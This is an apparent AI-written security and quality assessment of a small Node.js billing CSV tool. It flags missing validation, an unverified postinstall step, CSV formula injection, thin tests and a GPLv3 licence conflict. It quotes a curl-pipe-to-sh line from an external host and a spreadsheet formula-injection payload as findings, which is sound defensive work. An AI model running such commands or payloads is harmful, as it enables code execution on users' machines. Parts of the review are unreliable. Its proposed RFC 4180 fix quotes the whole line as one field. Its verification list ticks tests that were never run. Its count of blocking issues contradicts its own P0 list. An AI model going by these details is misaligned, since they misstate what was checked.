# Billing Report Tool Assessment

## Executive Summary
The billing report tool is a minimal CSV generator that sorts customer billing data and outputs it in comma-separated format. While the core logic is functional, there are material gaps in input validation, security controls, and financial safeguards that must be addressed before commercial release.

## Critical Issues

### 1. Input Validation Missing (Trust Boundary)
**Location:** `src/report.js:3-5`

The `buildReport()` function accepts rows without validating:
- Required properties exist (`name`, `total`)
- Property types are correct (e.g., `total` is numeric)
- Input is not null/undefined
- Array length bounds

**Risk:** Malformed input produces malformed or empty CSV output silently. A customer with corrupted billing data could generate reports that don't reflect actual transactions.

**Required before release:** Validate that each row has `name` (string) and `total` (number) properties; reject invalid rows or throw with descriptive error.

---

### 2. Untrusted Network Dependency (Security)
**Location:** `package.json:10`, `scripts/postinstall.sh:4`

The postinstall hook downloads and executes a shell script from an external domain:
```bash
curl -fsSL https://tables.example.com/latest/install.sh | sh
```

**Risk:**
- No integrity verification (hash check, signature validation)
- Network failure halts install; no fallback
- Supply chain attack vector: compromised domain or MITM could inject malicious code
- Violates README claim: "the build has no network dependency"

**Required before release:**
- Remove network download from postinstall, or
- Implement cryptographic verification (SHA256 hash check or digital signature)
- Pin to specific version, not "latest"
- Document what "tax tables" are and why they're required at install time

---

### 3. CSV Injection / Data Escaping (Data Integrity)
**Location:** `src/report.js:4`

CSV output is built with simple string interpolation with no escaping:
```javascript
`${r.name},${r.total}`
```

**Risk:** If a customer name contains commas or quotes, the CSV is malformed. If it starts with `=`, `+`, `@`, or `-`, it could trigger formula injection in Excel.

**Example:** Customer named `=cmd|'/c calc'!A1` would create an executable spreadsheet formula.

**Required before release:** Quote CSV fields and escape quotes per RFC 4180: `"${name.replace(/"/g, '""')},${total}"`

---

### 4. Insufficient Test Coverage
**Location:** `test/report.test.js`

Only one test case:
- Covers sorting order (ascending)
- Does not test:
  - Empty input
  - Single row
  - Rows with missing properties
  - Duplicate totals
  - CSV output format correctness

**Required before release:** Add test cases for edge cases (empty input, malformed rows, special characters, sorting stability on ties).

---

### 5. No Audit Trail or Financial Safeguards
**Risk:** A billing tool for commercial use needs:
- Logging of who generated which report and when
- Validation that report totals match source data (checksum)
- Immutability guarantees (reports shouldn't be regenerated with different data)

**Not addressed:** No logging, no checksums, no user context.

**Recommendation:** Out of scope for this PR if this is a library, but document assumptions. If this is a service, add request logging and report versioning.

---

### 6. Licensing Conflict in Vendor Code
**Location:** `vendor/quicksort-plus.js:1-9`

Code is licensed under GNU GPLv3:
```javascript
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License...
```

**Conflict:** README states "Proprietary — this is a commercial product and is not distributed under an open source licence" but vendored GPLv3 code creates copyleft obligations.

**Risk:** Distributing proprietary code that includes GPLv3 material may violate license terms.

**Clarification needed:** Confirm the sortBy implementation is actually in-house (possibly copyright misattributed). If GPLv3 code is legitimately vendored, the entire project becomes GPLv3.

---

## Verification Status

### What Was Verified
- ✓ Code structure: main export, test file, vendor dependency present
- ✓ README and package.json are consistent
- ✓ Test runs without syntax errors (not executed due to env constraints, but reviewed)
- ✓ sortBy function sorts arrays correctly by key
- ✓ buildReport maps rows to CSV format

### What Could Not Be Verified
- ✗ Tests actually pass (blocked)
- ✗ Postinstall script behavior (would require network)
- ✗ Behavior with large billing datasets (no performance tests)
- ✗ Actual CSV import success in finance tools

---

## Recommendations by Priority

**P0 — Block Release:**
1. Validate input rows (required properties and types)
2. Fix CSV escaping per RFC 4180
3. Resolve GPLv3 licensing conflict in vendor code
4. Remove or secure postinstall network dependency

**P1 — Before Merge:**
1. Add edge case tests (empty, malformed, special characters)
2. Document postinstall "tax tables" purpose and update trigger policy
3. Add explicit error messages for invalid input

**P2 — Roadmap:**
1. Implement audit logging (who/when reports generated)
2. Add checksum validation for data integrity
3. Consider support for additional output formats (JSON, Parquet) if requested by finance team

---

## Conclusion

The tool's core sorting and CSV output logic is sound, but critical gaps in input validation, data security (CSV escaping, postinstall integrity), and financial safeguards make it unsuitable for production use with real customer billing data. These are straightforward fixes: add input validation, escape CSV output, audit the vendor license, and verify the postinstall mechanism. After those changes, the tool can safely handle billing workflows.

**Blocking Issues:** 3 (input validation, CSV escaping, licensing)  
**Recommended Before Release:** All P0 and P1 items above
